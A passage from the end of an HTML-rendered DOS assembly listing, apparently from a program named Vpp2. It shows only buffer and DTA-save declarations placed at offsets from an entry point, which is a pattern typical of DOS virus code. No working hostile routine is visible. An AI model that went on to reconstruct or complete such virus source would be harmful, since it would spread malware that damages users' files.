</span><span class="sc5">Save_Ofs</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Save_DTA</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc9">Dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">400h</span><span class="sc0">    </span><span class="sc9">Dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">New_DTA</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
    </span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Vpp2</span><span class="sc0">
</span></div></body>
</html>
